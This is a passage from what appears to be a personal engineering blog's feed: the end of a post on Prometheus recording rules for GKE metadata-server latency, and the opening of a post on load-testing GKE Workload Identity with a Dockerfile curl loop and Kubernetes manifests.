</span><span class='line'><span class="l-Scalar-Plain">go_info{version=&quot;go1.14rc1&quot;} 1</span>
</span><span class='line'><span class="l-Scalar-Plain"># HELP go_memstats_alloc_bytes Number of bytes allocated and still in use.</span>
</span><span class='line'><span class="l-Scalar-Plain"># TYPE go_memstats_alloc_bytes gauge</span>
</span><span class='line'><span class="l-Scalar-Plain">go_memstats_alloc_bytes 2.4743056e+07</span>
</span><span class='line'><span class="l-Scalar-Plain"># HELP go_memstats_alloc_bytes_total Total number of bytes allocated, even if freed.</span>
</span><span class='line'><span class="l-Scalar-Plain"># TYPE go_memstats_alloc_bytes_total counter</span>
</span></code></pre></td></tr></table></div></figure>


<p>Voila. The important metrics are:</p>

<ul>
<li><code>metadata_server_request_count</code></li>
<li><code>metadata_server_request_durations_bucket</code></li>
</ul>


<p>I have these <a href="https://prometheus.io/docs/prometheus/latest/configuration/recording_rules/#recording-rules">Prometheus recording rules</a> to calculate RPS and request
duration percentiles.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">groups</span><span class="p-Indicator">:</span>
</span><span class='line'><span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server</span>
</span><span class='line'>  <span class="l-Scalar-Plain">rules</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="c1"># Compute a 5-minute rate for the counter `metadata_server_request_count`.</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_request_count:rate5m</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">rate(metadata_server_request_count[5m])</span>
</span><span class='line'>  <span class="c1"># Compute latency percentiles for the histogram metric</span>
</span><span class='line'>  <span class="c1"># `metadata_server_request_durations_bucket` over 5-minute increments for each label</span>
</span><span class='line'>  <span class="c1"># combination.</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_request_duration:p99</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.99, rate(metadata_server_request_durations_bucket[5m]))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_request_duration:p95</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.95, rate(metadata_server_request_durations_bucket[5m]))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_request_duration:p90</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.90, rate(metadata_server_request_durations_bucket[5m]))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_request_duration:p50</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.50, rate(metadata_server_request_durations_bucket[5m]))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_request_duration:mean</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">rate(metadata_server_request_durations_sum[5m]) / rate(metadata_server_request_durations_count[5m])</span>
</span><span class='line'>  <span class="c1"># Compute latency percentiles for the histogram metric</span>
</span><span class='line'>  <span class="c1"># `metadata_server_request_durations_bucket` over 5-minute increments and aggregate all</span>
</span><span class='line'>  <span class="c1"># labels. We must aggregate here instead of in Grafana because averaging percentiles doesn’t</span>
</span><span class='line'>  <span class="c1"># work. To compute a percentile, you need the original population of events. The math is just</span>
</span><span class='line'>  <span class="c1"># broken. An average of a percentile is meaningless.</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_all_request_duration:p99</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.99, sum(rate(metadata_server_request_durations_bucket[5m])) by (le))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_all_request_duration:p95</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.95, sum(rate(metadata_server_request_durations_bucket[5m])) by (le))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_all_request_duration:p90</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.90, sum(rate(metadata_server_request_durations_bucket[5m])) by (le))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_all_request_duration:p50</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.50, sum(rate(metadata_server_request_durations_bucket[5m])) by (le))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">metadata_server_all_request_duration:mean</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">rate(metadata_server_request_durations_sum[5m]) / rate(metadata_server_request_durations_count[5m])</span>
</span><span class='line'>  <span class="c1"># Compute latency percentiles for the histogram metric `outgoing_request_latency_bucket` over</span>
</span><span class='line'>  <span class="c1"># 5-minute increments for each label combination.</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_request_latency:p99</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.99, rate(outgoing_request_latency_bucket[5m]))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_request_latency:p95</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.95, rate(outgoing_request_latency_bucket[5m]))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_request_latency:p90</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.90, rate(outgoing_request_latency_bucket[5m]))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_request_latency:p50</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.50, rate(outgoing_request_latency_bucket[5m]))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_request_latency:mean</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">rate(outgoing_request_latency_sum[5m]) / rate(outgoing_request_latency_count[5m])</span>
</span><span class='line'>  <span class="c1"># Compute latency percentiles for the histogram metric `outgoing_request_latency_bucket` over</span>
</span><span class='line'>  <span class="c1"># 5-minute increments and aggregate all labels. We must aggregate here instead of in Grafana</span>
</span><span class='line'>  <span class="c1"># because averaging percentiles doesn’t work. To compute a percentile, you need the original</span>
</span><span class='line'>  <span class="c1"># population of events. The math is just broken. An average of a percentile is meaningless.</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_all_request_latency:p99</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.99, sum(rate(outgoing_request_latency_bucket[5m])) by (le))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_all_request_latency:p95</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.95, sum(rate(outgoing_request_latency_bucket[5m])) by (le))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_all_request_latency:p90</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.90, sum(rate(outgoing_request_latency_bucket[5m])) by (le))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_all_request_latency:p50</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">histogram_quantile(0.50, sum(rate(outgoing_request_latency_bucket[5m])) by (le))</span>
</span><span class='line'>  <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">record</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">outgoing_all_request_latency:mean</span>
</span><span class='line'>    <span class="l-Scalar-Plain">expr</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">rate(outgoing_request_latency_sum[5m]) / rate(outgoing_request_latency_count[5m])</span>
</span></code></pre></td></tr></table></div></figure>


<p>Thanks to <a href="https://twitter.com/mikedanese">@mikedanese</a> for the intial idea of using <code>socat</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[3 Levels of Load Testing GKE Workload Identity]]></title>
    <link href="https://www.davidxia.com/2020/04/3-levels-of-load-testing-gke-workload-identity/"/>
    <updated>2020-04-01T10:21:11-04:00</updated>
    <id>https://www.davidxia.com/2020/04/3-levels-of-load-testing-gke-workload-identity</id>
    <content type="html"><![CDATA[<p>I manage multitenant <a href="https://cloud.google.com/kubernetes-engine">Google Kubernetes Engine</a> (GKE) clusters for stateless backend services at
work. Google recently graduated GKE&rsquo;s <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity">Workload Identity</a> (WI) feature to generally available
(GA). When my team used WI during its beta stage, it seemed to fail when there were more than 16
requests per second (RPS) on one GKE node to retrieve Google access tokens.</p>

<p>Before we knew about this low RPS failure threshold, we told many internal engineering teams
to go ahead and use the feature. In hindsight, we should&rsquo;ve load-tested the feature before making it
generally available internally especially since it wasn&rsquo;t even GA publicly.</p>

<p>My efforts to load test WI have grown more sophisticated over time. This post describes the
progression. It&rsquo;s like the &ldquo;4 Levels of &hellip;&rdquo; <a href="https://www.youtube.com/playlist?list=PLz3-p2q6vFYUDvVUu_aPhGUV-3ROIa6d2">Epicurious Youtube videos</a>. The goal here is to find
out at what RPS WI starts to fail and to try to learn some generalizable lessons from load testing
vendor-managed services.</p>

<h3>tl;dr lessons learned</h3>

<ul>
<li>always load test new features above and beyond what you expect your production load will be</li>
<li>use proper load testing tools and not bash for loops</li>
</ul>


<!-- more -->


<h2>My specific GKE cluster configuration</h2>

<ul>
<li>GKE masters and nodes running version 1.15.9-gke.22</li>
<li>regional cluster in Google Cloud Platform (GCP) (not on-premise)</li>
<li>4 GKE nodes that are n1-standard-32 GCE instances in one node pool</li>
<li>each node is configured to have a maximum of 32 Pods</li>
<li>cluster and node pool have WI enabled</li>
</ul>


<h2>High level of what Workload Identity is and how it works</h2>

<p>Workloads on GKE often need to access GCP resources like PubSub or CloudSQL.
In order to do so, your workload needs to use a Google Service Account (GSA) key that is authorized to
access those resources. So you end up creating keys for all your GSA&rsquo;s and copy-pasting
these keys into Kubernetes Secrets for your workloads. This is insecure and not maintainable if you
are a company that has dozens of engineering teams and hundreds of workloads.</p>

<p>So GCP offered WI which allows a Kubernetes Service Account (KSA) to be associated with a GSA. If a
workload can run with a certain KSA, it&rsquo;ll transparently get the Google access token for the
associated GSA. No manual copy-pasting GSA keys!</p>

<p>How does this work? You have to enable WI on your cluster and node pool. This creates a
<code>gke-metadata-server</code> DaemonSet in the <code>kube-system</code> namespace. <code>gke-metadata-server</code> is the
entrypoint to the whole WI system. Here&rsquo;s a nice <a href="https://www.youtube.com/watch?v=s4NYEJDFc0M">Google Cloud Next conference talk</a> with more
details.</p>

<p><code>gke-metadata-server</code> is the only part of WI that is exposed to GKE users, i.e. runs on machines you
control. It&rsquo;s like the Verizon FiOS box in your basement. You control your house, but there&rsquo;s a
little box that Verizon owns and operates in there. All other parts of WI run on GCP infrastructure
that you can&rsquo;t see. When I saw failures with WI, it all seemed to happen in
<code>gke-metadata-server</code>. So that&rsquo;s what I&rsquo;ll load test.</p>

<p>Here&rsquo;s the <code>gke-metadata-server</code> DaemonSet YAML for reference. As of the time of this writing the
image is <code>gke.gcr.io/gke-metadata-server:20200218_1145_RC0</code>. You might see different behavior with
different images.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>apiVersion: extensions/v1beta1
</span><span class='line'>kind: DaemonSet
</span><span class='line'>metadata:
</span><span class='line'>  creationTimestamp: "2019-10-15T17:04:40Z"
</span><span class='line'>  generation: 8
</span><span class='line'>  labels:
</span><span class='line'>    addonmanager.kubernetes.io/mode: Reconcile
</span><span class='line'>    k8s-app: gke-metadata-server
</span><span class='line'>  name: gke-metadata-server
</span><span class='line'>  namespace: kube-system
</span><span class='line'>  resourceVersion: "138588210"
</span><span class='line'>  selfLink: /apis/extensions/v1beta1/namespaces/kube-system/daemonsets/gke-metadata-server
</span><span class='line'>  uid: e06885d8-ef6d-11e9-88c9-42010a8c0110
</span><span class='line'>spec:
</span><span class='line'>  revisionHistoryLimit: 10
</span><span class='line'>  selector:
</span><span class='line'>    matchLabels:
</span><span class='line'>      k8s-app: gke-metadata-server
</span><span class='line'>  template:
</span><span class='line'>    metadata:
</span><span class='line'>      annotations:
</span><span class='line'>        components.gke.io/component-name: gke-metadata-server
</span><span class='line'>        components.gke.io/component-version: 0.2.21
</span><span class='line'>        scheduler.alpha.kubernetes.io/critical-pod: '"''"'
</span><span class='line'>      creationTimestamp: null
</span><span class='line'>      labels:
</span><span class='line'>        addonmanager.kubernetes.io/mode: Reconcile
</span><span class='line'>        k8s-app: gke-metadata-server
</span><span class='line'>    spec:
</span><span class='line'>      containers:
</span><span class='line'>      - command:
</span><span class='line'>        - /gke-metadata-server
</span><span class='line'>        - --logtostderr
</span><span class='line'>        - --token-exchange-endpoint=https://securetoken.googleapis.com/v1/identitybindingtoken
</span><span class='line'>        - --identity-namespace=[redacted].svc.id.goog
</span><span class='line'>        - --identity-provider-id=https://container.googleapis.com/v1/projects/[redacted]/locations/asia-east1/clusters/[redacted]
</span><span class='line'>        - --passthrough-ksa-list=kube-system:container-watcher-pod-reader,kube-system:event-exporter-sa,kube-system:fluentd-gcp-scaler,kube-system:heapster,kube-system:kube-dns,kube-system:metadata-agent,kube-system:network-metering-agent,kube-system:securityprofile-controller,istio-system:istio-ingressgateway-service-account,istio-system:cluster-local-gateway-service-account,csm:csm-sync-agent,knative-serving:controller
</span><span class='line'>        - --attributes=cluster-name=[redacted],cluster-uid=[redacted],cluster-location=asia-east1
</span><span class='line'>        - --enable-identity-endpoint=true
</span><span class='line'>        - --cluster-uid=[redacted]
</span><span class='line'>        image: gke.gcr.io/gke-metadata-server:20200218_1145_RC0
</span><span class='line'>        imagePullPolicy: IfNotPresent
</span><span class='line'>        livenessProbe:
</span><span class='line'>          failureThreshold: 3
</span><span class='line'>          httpGet:
</span><span class='line'>            host: 127.0.0.1
</span><span class='line'>            path: /healthz
</span><span class='line'>            port: 54898
</span><span class='line'>            scheme: HTTP
</span><span class='line'>          initialDelaySeconds: 10
</span><span class='line'>          periodSeconds: 10
</span><span class='line'>          successThreshold: 1
</span><span class='line'>          timeoutSeconds: 1
</span><span class='line'>        name: gke-metadata-server
</span><span class='line'>        resources:
</span><span class='line'>          limits:
</span><span class='line'>            cpu: 100m
</span><span class='line'>            memory: 100Mi
</span><span class='line'>          requests:
</span><span class='line'>            cpu: 100m
</span><span class='line'>            memory: 100Mi
</span><span class='line'>        securityContext:
</span><span class='line'>          privileged: true
</span><span class='line'>        terminationMessagePath: /dev/termination-log
</span><span class='line'>        terminationMessagePolicy: File
</span><span class='line'>        volumeMounts:
</span><span class='line'>        - mountPath: /var/lib/kubelet/kubeconfig
</span><span class='line'>          name: kubelet-credentials
</span><span class='line'>          readOnly: true
</span><span class='line'>        - mountPath: /var/lib/kubelet/pki/
</span><span class='line'>          name: kubelet-certs
</span><span class='line'>          readOnly: true
</span><span class='line'>        - mountPath: /var/run/
</span><span class='line'>          name: container-runtime-interface
</span><span class='line'>        - mountPath: /etc/srv/kubernetes/pki
</span><span class='line'>          name: kubelet-pki
</span><span class='line'>          readOnly: true
</span><span class='line'>        - mountPath: /etc/ssl/certs/
</span><span class='line'>          name: ca-certificates
</span><span class='line'>          readOnly: true
</span><span class='line'>      dnsPolicy: Default
</span><span class='line'>      hostNetwork: true
</span><span class='line'>      nodeSelector:
</span><span class='line'>        beta.kubernetes.io/os: linux
</span><span class='line'>        iam.gke.io/gke-metadata-server-enabled: "true"
</span><span class='line'>      priorityClassName: system-node-critical
</span><span class='line'>      restartPolicy: Always
</span><span class='line'>      schedulerName: default-scheduler
</span><span class='line'>      securityContext: {}
</span><span class='line'>      serviceAccount: gke-metadata-server
</span><span class='line'>      serviceAccountName: gke-metadata-server
</span><span class='line'>      terminationGracePeriodSeconds: 30
</span><span class='line'>      tolerations:
</span><span class='line'>      - effect: NoExecute
</span><span class='line'>        operator: Exists
</span><span class='line'>      - effect: NoSchedule
</span><span class='line'>        operator: Exists
</span><span class='line'>      volumes:
</span><span class='line'>      - hostPath:
</span><span class='line'>          path: /var/lib/kubelet/pki/
</span><span class='line'>          type: Directory
</span><span class='line'>        name: kubelet-certs
</span><span class='line'>      - hostPath:
</span><span class='line'>          path: /var/lib/kubelet/kubeconfig
</span><span class='line'>          type: File
</span><span class='line'>        name: kubelet-credentials
</span><span class='line'>      - hostPath:
</span><span class='line'>          path: /var/run/
</span><span class='line'>          type: Directory
</span><span class='line'>        name: container-runtime-interface
</span><span class='line'>      - hostPath:
</span><span class='line'>          path: /etc/srv/kubernetes/pki/
</span><span class='line'>          type: Directory
</span><span class='line'>        name: kubelet-pki
</span><span class='line'>      - hostPath:
</span><span class='line'>          path: /etc/ssl/certs/
</span><span class='line'>          type: Directory
</span><span class='line'>        name: ca-certificates
</span><span class='line'>  templateGeneration: 8
</span><span class='line'>  updateStrategy:
</span><span class='line'>    rollingUpdate:
</span><span class='line'>      maxUnavailable: 1
</span><span class='line'>    type: RollingUpdate</span></code></pre></td></tr></table></div></figure>


<h2>Level 1</h2>

<p>What kind of load am I putting on <code>gke-metadata-server</code>? Since this DaemonSet exists to give out
Google access tokens, I&rsquo;ll send it HTTP requests asking for such tokens.</p>

<p>I built a Docker image with the following <code>Dockerfile</code>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>FROM google/cloud-sdk
</span><span class='line'>ENTRYPOINT while true; do for i in {1..20}; do curl -X GET https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=$(gcloud auth print-access-token) & done; wait; done;</span></code></pre></td></tr></table></div></figure>


<p>Then I created the following K8s Deployment YAML.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">apps/v1</span>
</span><span class='line'><span class="l-Scalar-Plain">kind</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Deployment</span>
</span><span class='line'><span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">wi-test</span>
</span><span class='line'>  <span class="l-Scalar-Plain">namespace</span><span class="p-Indicator">:</span> <span class="p-Indicator">[</span><span class="nv">K8S_NAMESPACE</span><span class="p-Indicator">]</span>
</span><span class='line'><span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">replicas</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">7</span>
</span><span class='line'>  <span class="l-Scalar-Plain">selector</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">matchLabels</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">wi-test</span>
</span><span class='line'>  <span class="l-Scalar-Plain">template</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">labels</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">wi-test</span>
</span><span class='line'>    <span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">nodeSelector</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">kubernetes.io/hostname</span><span class="p-Indicator">:</span> <span class="p-Indicator">[</span><span class="nv">NODE-NAME</span><span class="p-Indicator">]</span>
</span><span class='line'>      <span class="l-Scalar-Plain">containers</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">my-docker-image</span>
</span><span class='line'>        <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">workload-identity-test</span>
</span></code></pre></td></tr></table></div></figure>


<p>I ran seven of these Pods on a single node (see the <code>nodeSelector</code> above) to target a single
instance of <code>gke-metadata-server</code>.</p>

<p>This isn&rsquo;t a great test because there&rsquo;s a lot of extra work performed by the Container in running
<code>gcloud</code> to print a Google access token (there may be bottlenecks in this <code>gcloud</code> command itself
which is Python code), curling the <code>googleapis.com</code> endpoint to get the token info (originally done
to verify the token was valid). And there&rsquo;s probably bottlenecks in using a shell to do this. All in
all, this implementation doesn&rsquo;t really let you specify a fixed RPS. You&rsquo;re at the mercy of how fast
your Container, shell, gcloud, and the network will let you execute this. I also wasn&rsquo;t able to run
more Pods on a single node because I was hitting the max 32 pods per node limit. There were already
a bunch of other GKE-system level workloads like Calico that took up node capacity.</p>

